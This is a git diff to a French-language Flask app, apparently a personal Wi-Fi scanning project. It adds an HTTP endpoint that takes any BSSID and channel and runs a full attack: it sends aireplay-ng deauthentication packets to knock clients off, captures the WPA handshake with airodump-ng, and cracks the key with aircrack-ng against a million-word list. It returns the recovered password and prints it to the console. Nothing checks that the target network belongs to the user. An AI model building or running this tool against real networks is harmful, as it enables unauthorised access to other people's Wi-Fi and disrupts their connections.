@@ -4,8 +4,9 @@ import nmap
 import psycopg2
 import json
 import threading
+import time
 
-from flask import Flask , jsonify,render_template
+from flask import Flask , jsonify,render_template,request
 from flask_cors import CORS
 
 app = Flask(__name__,template_folder="frontend",static_folder="frontend")
@@ -35,7 +36,7 @@ def detecter_sous_reseau():
             return None
     else:
         return None
-
+    
 @app.route("/api/scanner_reseau")
 def scanner_reseau():
     sous_reseau=detecter_sous_reseau()
@@ -109,11 +110,14 @@ def detecter_interface():
     
 def activer_mode_monitor():
     resultat = subprocess.run([ "airmon-ng", "start", interface], capture_output=True, text=True)
+    subprocess.run(["airmon-ng","check","kill"],capture_output=True,text=True)
+    subprocess.run(["airmon-ng","check","kill"],capture_output=True,text=True)
     return (resultat.stdout)
 
 def desactiver_mode_monitor():
     interface_pis = f"{interface}mon"
     resultat = subprocess.run(["airmon-ng", "stop", interface_pis], capture_output=True, text=True)
+    subprocess.run(["systemctl","restart","NetworkManager"])
     return (resultat.stdout)
 
 number = 1
@@ -121,7 +125,7 @@ number = 1
 def parcourir_air():
     global number
     interface_pis = f"{interface}mon"
-    fichier="/home/tchenga/projet/scanweb/scan_wifi"
+    fichier="/tmp/scan_wifi"
     subprocess.run(["timeout","-k" ,"5","15","airodump-ng",  interface_pis,"--output-format","csv","--write",fichier],
     stdout=subprocess.DEVNULL,
     stderr=subprocess.DEVNULL
@@ -133,7 +137,7 @@ def parcourir_air():
         for l,t in enumerate(lignes):
             if t != "\n" and l>1:
                 t=t.split(",")
-                parcour.append({"BSSID": t[0],"Channel" : t[3],"Chiffrement" :t[5],"Essid":t[13]})
+                parcour.append({"BSSID": t[0],"Channel" : t[3].strip(),"Chiffrement" :t[5],"Essid":t[13]})
             elif t == "\n" and l >1 :
                 break
     number += 1
@@ -175,6 +179,85 @@ def lancer_scan_wifi():
 @app.route("/api/wifi/statut")
 def statut_scan_wifi():
     return jsonify(etat_scan_wifi)
+
+times = 1
+def capturer_handshake(bssid, canal, interface_monitor):
+    global times
+    fichier = "tmp/handshake"
+    processus_capture = subprocess.Popen(["airodump-ng", "--bssid", bssid, "--channel", str(canal), "--write", fichier, interface_monitor],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(2) 
+    death =  subprocess.run(["aireplay-ng","--deauth","8","-a",bssid,interface_monitor])
+    if death.returncode == 0:
+        time.sleep(20)
+        processus_capture.terminate()
+        processus_capture.wait()
+        fiche = fichier + f"-0{times}.cap"
+        times +=1
+        return fiche
+    else:
+        return 
+
+etat_test_wifi = {"en_cours": False, "resultat": None}
+def test_password(bssid,canal):
+    global interface
+    interface = detecter_interface()
+    activer_mode_monitor()
+    interface_pis = f"{interface}mon"
+    handshake = capturer_handshake(bssid,canal,interface_pis)
+    if handshake is None:
+        etat_test_wifi["resultat"] = {"erreur": "Échec de la capture"}
+        etat_test_wifi["en_cours"] = False
+        return ()
+    else:
+        word = test_force(handshake)
+    desactiver_mode_monitor()
+    time.sleep(5)
+    etat_test_wifi["en_cours"] = False
+    etat_test_wifi["resultat"] = word
+
+@app.route("/api/wifi/test-force")
+def lancer_status_password():
+    bssid =request.args.get('bssid')
+    canal = request.args.get('canal')
+    if etat_test_wifi["en_cours"]:
+        return jsonify({"erreur": "Un scan est déjà en cours"}), 409
+    etat_test_wifi["en_cours"] = True
+    etat_test_wifi["resultat"] = None
+    thread = threading.Thread(target=test_password,args=(bssid,canal))
+    thread.start()
+    return jsonify({"status": "lancé"})
+
+@app.route("/api/wifi/statut_test")
+def status_password():
+    return jsonify(etat_test_wifi)
+
+def test_force(handshake):
+    global interface
+    interface = detecter_interface()
+    test_force_brut = subprocess.run(["aircrack-ng",handshake,"-w","/home/tchenga/projet/scanweb/ignis-1M.txt"],capture_output=True,text=True)
+    password=test_force_brut.stdout
+    if  "No valid WPA handshakes found" in  password:
+           return {"Erreur":"Erreur!!! le handshake n'as pas eu lieu : Verifier si un appareil est connecter a votre point d'acces ou augmenter le nombre de paquets deauth a envoyer"},500
+    else:
+                password_ligne=password.splitlines()
+                password_find=[]
+                for j in password_ligne:
+                    if "KEY FOUND!" in j :
+                        password_find.append(j)
+                if password_find != []:
+                    password_1=password_find[0].split("[")
+                    for i in password_1:
+                        if "]" in i :
+                            global pasword
+                            pasword=i.split("]")
+                    resultat=pasword[0].strip()
+                    print(f"le resutat est iciiiiiiiiiiiiiiiiiiiiiiii 1:{password_1}")
+                    print(f"le resutat est iciiiiiiiiiiiiiiiiiiiiiiii 2:{pasword}")
+                    print(f"le resutat est iciiiiiiiiiiiiiiiiiiiiiiii :{resultat}")
+                    return {"Mot de passe":resultat}
+                else:
+                    return {"message" :"Test reussi , mot de passe introuvable"}
+                
 
 if __name__ == "__main__":
     app.run(debug=True, port=5000,threaded=True,use_reloader=False)
